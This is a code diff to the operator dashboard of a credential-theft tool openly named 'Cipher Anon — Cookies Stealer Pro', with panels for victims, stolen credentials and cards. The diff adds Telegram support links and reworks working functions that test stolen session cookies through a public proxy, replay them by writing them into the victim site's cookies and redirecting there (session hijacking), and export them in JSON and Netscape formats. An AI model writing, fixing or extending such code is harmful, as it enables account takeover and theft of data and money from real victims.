@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cipher Anon — Cookies Stealer Pro</title>
 
-    <!-- FULL SOURCE PROTECTION -->
     <script>
         (function() {
             document.addEventListener('keydown', function(e) {
@@ -130,6 +129,32 @@
         .sidebar .version { font-size: 9px; color: #1e293b; text-align: center; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
         .sidebar .version span { color: #00ff88; }
 
+        /* ===== CONTACT SUPPORT BUTTON (Sidebar) ===== */
+        .sidebar .contact-support {
+            margin-top: 6px;
+            padding: 6px 12px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #1a2a3a, #0f1626);
+            border: 1px solid #0088cc;
+            color: #00aaff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .sidebar .contact-support:hover {
+            background: linear-gradient(135deg, #1a3a5a, #162030);
+            border-color: #00ccff;
+            color: #66ddff;
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(0,136,204,0.2);
+        }
+        .sidebar .contact-support .icon { font-size: 16px; }
+
         .sidebar .nav-item.trash-nav { color: #f59e0b; }
         .sidebar .nav-item.trash-nav:hover { color: #ffaa44; background: #1a1400; }
         .sidebar .nav-item.trash-nav.active { color: #f59e0b; border-left-color: #f59e0b; }
@@ -229,6 +254,31 @@
             gap: 10px;
             flex-wrap: wrap;
         }
+
+        /* ===== CONTACT SUPPORT BUTTON (Topbar) ===== */
+        .topbar .right .contact-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #1a2a3a, #0f1626);
+            border: 1px solid #0088cc;
+            color: #00aaff;
+            padding: 4px 12px;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .topbar .right .contact-btn:hover {
+            background: linear-gradient(135deg, #1a3a5a, #162030);
+            border-color: #00ccff;
+            color: #66ddff;
+            box-shadow: 0 0 20px rgba(0,136,204,0.2);
+            transform: scale(1.02);
+        }
+
         .topbar .right .live-badge {
             display: flex;
             align-items: center;
@@ -879,6 +929,7 @@
             .stats-row { grid-template-columns: 1fr; }
             .toolbar .left, .toolbar .right { width: 100%; justify-content: center; }
             .topbar .right { flex-wrap: wrap; justify-content: center; }
+            .topbar .right .contact-btn { font-size: 10px; padding: 3px 8px; }
             .topbar .right .settings-btn { font-size: 11px; padding: 3px 8px; }
             .topbar .right .logout-btn { font-size: 11px; padding: 3px 8px; }
             .topbar .right .user { font-size: 11px; padding: 3px 8px; }
@@ -895,6 +946,7 @@
             .settings-modal { padding: 12px; }
             .stats-row .stat-card .number { font-size: 20px; }
             .btn { font-size: 10px; padding: 4px 8px; }
+            .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -921,6 +973,13 @@
             </div>
             <div class="sub">Cookies <span>Stealer</span> Pro</div>
         </div>
+
+        <!-- ===== CONTACT SUPPORT (Sidebar Top) ===== -->
+        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support" title="Contact Support on Telegram">
+            <span class="icon">✉️</span> Contact Support
+        </a>
+
+        <div style="height:4px;"></div>
 
         <div class="nav-item active" data-view="main" id="navMain">
             <span class="icon">📊</span> Dashboard
@@ -974,6 +1033,10 @@
                 <p id="pageSub">Monitor stolen cookies &amp; sessions · <span class="accent">Cipher Anon</span> Pro</p>
             </div>
             <div class="right">
+                <!-- ===== CONTACT SUPPORT (Topbar) ===== -->
+                <a href="https://t.me/nullrouterot13" target="_blank" class="contact-btn" title="Contact Support on Telegram">
+                    ✉️ Support
+                </a>
                 <div class="live-badge">
                     <span class="dot"></span>
                     Live
@@ -1275,7 +1338,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — COMPLETE WITH FIXED TEST FUNCTIONS
+    DASHBOARD LOGIC — COMPLETE
     ============================================================ -->
     <script>
         // ============================================================
@@ -1977,17 +2040,49 @@
         }
 
         // ============================================================
-        // SESSION TESTER — FIXED (no iframe)
+        // SESSION TESTER — FIXED
         // ============================================================
 
         async function testSession(domain) {
             let cookies = {};
+            let actualDomain = domain;
+            let found = false;
+            
+            // Find the actual victim entry
             allData.forEach(entry => {
                 const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
                     Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                    found = true;
                 }
             });
+
+            // If no cookies found, try to find any domain
+            if (Object.keys(cookies).length === 0) {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && ed === domain) {
+                        Object.assign(cookies, entry.cookies || {});
+                        actualDomain = ed;
+                        found = true;
+                        break;
+                    }
+                }
+            }
+
+            // If still no cookies, try to find any domain that's not our own
+            if (Object.keys(cookies).length === 0) {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        Object.assign(cookies, entry.cookies || {});
+                        actualDomain = ed;
+                        found = true;
+                        break;
+                    }
+                }
+            }
 
             if (Object.keys(cookies).length === 0) {
                 showToast('❌ No cookies found for ' + domain, 'error');
@@ -1996,17 +2091,15 @@
                     resultMsg.className = 'test-result show invalid';
                     resultMsg.textContent = `❌ ${domain} — No cookies found`;
                 }
+                const btn = document.querySelector('.modal .session-actions .test');
+                if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
                 return;
             }
 
-            const btn = event?.target;
-            if (btn) { btn.textContent = '⏳'; btn.style.opacity = '0.6'; btn.disabled = true; }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
 
             try {
-                // Try proxy first
-                const testUrl = `https://${domain}`;
-                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(testUrl)}`;
-
+                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://${cleanDomain}`)}`;
                 const response = await fetch(proxyUrl, {
                     method: 'GET',
                     signal: AbortSignal.timeout(10000)
@@ -2016,31 +2109,31 @@
                 if (resultMsg) {
                     if (response.ok || response.status < 400) {
                         resultMsg.className = 'test-result show valid';
-                        resultMsg.textContent = `✅ ${domain} — Valid (${response.status})`;
-                        showToast(`✅ ${domain} — Valid`, 'success');
+                        resultMsg.textContent = `✅ ${cleanDomain} — Valid (${response.status})`;
+                        showToast(`✅ ${cleanDomain} — Valid`, 'success');
                     } else {
                         resultMsg.className = 'test-result show invalid';
-                        resultMsg.textContent = `❌ ${domain} — Failed (${response.status})`;
-                        showToast(`❌ ${domain} — Failed (${response.status})`, 'error');
+                        resultMsg.textContent = `❌ ${cleanDomain} — Failed (${response.status})`;
+                        showToast(`❌ ${cleanDomain} — Failed (${response.status})`, 'error');
                     }
                 }
             } catch (e) {
-                // Fallback: open in new tab
-                const win = window.open(`https://${domain}`, '_blank');
+                const win = window.open(`https://${cleanDomain}`, '_blank');
                 const resultMsg = document.getElementById('testResultModal');
                 if (resultMsg) {
                     if (win) {
                         resultMsg.className = 'test-result show valid';
-                        resultMsg.textContent = `✅ ${domain} — Opened in new tab (check manually)`;
-                        showToast(`✅ ${domain} — Opened in new tab`, 'success');
+                        resultMsg.textContent = `✅ ${cleanDomain} — Opened in new tab (check manually)`;
+                        showToast(`✅ ${cleanDomain} — Opened in new tab`, 'success');
                     } else {
                         resultMsg.className = 'test-result show invalid';
-                        resultMsg.textContent = `⚠️ ${domain} — ${e.message || 'Could not reach domain'}`;
-                        showToast(`⚠️ ${domain} — ${e.message || 'Could not reach domain'}`, 'error');
+                        resultMsg.textContent = `⚠️ ${cleanDomain} — ${e.message || 'Could not reach domain'}`;
+                        showToast(`⚠️ ${cleanDomain} — ${e.message || 'Could not reach domain'}`, 'error');
                     }
                 }
             }
 
+            const btn = document.querySelector('.modal .session-actions .test');
             if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
         }
 
@@ -2647,20 +2740,44 @@
         }
 
         // ============================================================
-        // SESSION REPLAY
+        // SESSION REPLAY — FIXED
         // ============================================================
 
         function replaySession(domain) {
             let cookies = {};
+            let actualDomain = domain;
+            let found = false;
+            
+            // Find the actual victim entry with this domain
             allData.forEach(entry => {
                 const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
                     Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                    found = true;
                 }
             });
 
             if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found', 'error');
+                showToast('❌ No cookies found for ' + domain, 'error');
+                return;
+            }
+
+            // If the domain is our own railway domain, try to find a better one
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        cookies = {};
+                        Object.assign(cookies, entry.cookies || {});
+                        break;
+                    }
+                }
+            }
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No valid domain found to replay', 'error');
                 return;
             }
 
@@ -2670,146 +2787,154 @@
                 return;
             }
 
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
             win.document.write(`
                 <!DOCTYPE html>
-                <html><head><title>Loading...</title>
-                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;}
-</style></head><body>
-<div class="s"></div>
-<p>Loading <strong>${domain}</strong>...</p>
-<script>
-    const cookies = ${JSON.stringify(cookies)};
-    let count = 0;
-    Object.entries(cookies).forEach(([name, value]) => {
-        try { document.cookie = name + '=' + value + '; domain=.${domain}; path=/'; count++; } catch(e) {}
-    });
-    setTimeout(() => window.location.href = 'https://' + '${domain}', 1500);
-<\/script>
-</body></html>
-`);
-win.document.close();
-showToast('▶️ Replay started', 'success');
-}
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(cookies)};
+                    let count = 0;
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { 
+                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
+                            count++; 
+                        } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replay started for ' + cleanDomain, 'success');
+        }
 
-function replayFromModal() {
-if (currentModalDomain) replaySession(currentModalDomain);
-}
+        function replayFromModal() {
+            if (currentModalDomain) replaySession(currentModalDomain);
+        }
 
-// ============================================================
-// TEST FROM MODAL
-// ============================================================
+        // ============================================================
+        // TEST FROM MODAL
+        // ============================================================
 
-function testFromModal() {
-    if (currentModalDomain) {
-        // Store the event target for the button state
-        const btn = document.querySelector('.modal .session-actions .test');
-        const fakeEvent = { target: btn };
-        testSession.call({}, currentModalDomain);
-    }
-}
+        function testFromModal() {
+            if (currentModalDomain) {
+                const btn = document.querySelector('.modal .session-actions .test');
+                if (btn) {
+                    btn.textContent = '⏳';
+                    btn.style.opacity = '0.6';
+                    btn.disabled = true;
+                }
+                testSession(currentModalDomain);
+            }
+        }
 
-// ============================================================
-// EXPORT FUNCTIONS
-// ============================================================
+        // ============================================================
+        // EXPORT FUNCTIONS
+        // ============================================================
 
-function downloadJSON() {
-if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
-const url = URL.createObjectURL(blob);
-const a = document.createElement('a');
-a.href = url;
-a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
-document.body.appendChild(a);
-a.click();
-document.body.removeChild(a);
-URL.revokeObjectURL(url);
-showToast('📥 JSON exported', 'success');
-}
+        function downloadJSON() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 JSON exported', 'success');
+        }
 
-function downloadNetscape() {
-if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
-allData.forEach(entry => {
-const cookies = entry.cookies || {};
-const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
-Object.entries(cookies).forEach(([name, value]) => {
-const expiry = Math.floor(Date.now() / 1000) + 31536000;
-lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
-});
-});
-const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
-const url = URL.createObjectURL(blob);
-const a = document.createElement('a');
-a.href = url;
-a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
-document.body.appendChild(a);
-a.click();
-document.body.removeChild(a);
-URL.revokeObjectURL(url);
-showToast('📥 Netscape exported', 'success');
-}
+        function downloadNetscape() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
+            allData.forEach(entry => {
+                const cookies = entry.cookies || {};
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
+                Object.entries(cookies).forEach(([name, value]) => {
+                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
+                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
+                });
+            });
+            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Netscape exported', 'success');
+        }
 
-// ============================================================
-// LOGOUT
-// ============================================================
+        // ============================================================
+        // LOGOUT
+        // ============================================================
 
-function showLogoutConfirm() {
-document.getElementById('logoutConfirmOverlay').classList.add('active');
-}
+        function showLogoutConfirm() {
+            document.getElementById('logoutConfirmOverlay').classList.add('active');
+        }
 
-function hideLogoutConfirm() {
-document.getElementById('logoutConfirmOverlay').classList.remove('active');
-}
+        function hideLogoutConfirm() {
+            document.getElementById('logoutConfirmOverlay').classList.remove('active');
+        }
 
-function executeLogout() {
-hideLogoutConfirm();
-window.location.href = '/api/logout';
-}
+        function executeLogout() {
+            hideLogoutConfirm();
+            window.location.href = '/api/logout';
+        }
 
-// ============================================================
-// INIT
-// ============================================================
+        // ============================================================
+        // INIT
+        // ============================================================
 
-document.addEventListener('DOMContentLoaded', function() {
-    checkSession().then((valid) => {
-        if (!valid) return;
+        document.addEventListener('DOMContentLoaded', function() {
+            checkSession().then((valid) => {
+                if (!valid) return;
 
-        const navItems = document.querySelectorAll('.sidebar .nav-item[data-view]');
-        navItems.forEach(item => {
-            item.addEventListener('click', function() {
-                const view = this.dataset.view;
-                if (view) switchView(view);
+                const navItems = document.querySelectorAll('.sidebar .nav-item[data-view]');
+                navItems.forEach(item => {
+                    item.addEventListener('click', function() {
+                        const view = this.dataset.view;
+                        if (view) switchView(view);
+                    });
+                });
+
+                fetchData();
+                fetchTrash();
+                setInterval(() => {
+                    if (currentView === 'main') fetchData();
+                    else if (currentView === 'trash') fetchTrash();
+                    else if (currentView === 'cookies') renderCookiesView();
+                    else if (currentView === 'victims') renderVictimsView();
+                    else if (currentView === 'creds') renderCredsView();
+                    else if (currentView === 'cards') renderCardsView();
+                    else if (currentView === 'replay') populateReplayDomains();
+                }, 10000);
+
+                document.getElementById('trashCount').textContent = trashData.length;
             });
         });
 
-        fetchData();
-        fetchTrash();
-        setInterval(() => {
-            if (currentView === 'main') fetchData();
-            else if (currentView === 'trash') fetchTrash();
-            else if (currentView === 'cookies') renderCookiesView();
-            else if (currentView === 'victims') renderVictimsView();
-            else if (currentView === 'creds') renderCredsView();
-            else if (currentView === 'cards') renderCardsView();
-            else if (currentView === 'replay') populateReplayDomains();
-        }, 10000);
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeModal();
+                closeSettings();
+                closeSidebar();
+                hideLogoutConfirm();
+                hideCustomConfirm();
+            }
+        });
 
-        document.getElementById('trashCount').textContent = trashData.length;
-    });
-});
-
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') {
-        closeModal();
-        closeSettings();
-        closeSidebar();
-        hideLogoutConfirm();
-        hideCustomConfirm();
-    }
-});
-
-console.clear();
-</script>
+        console.clear();
+    </script>
 </body>
 </html>
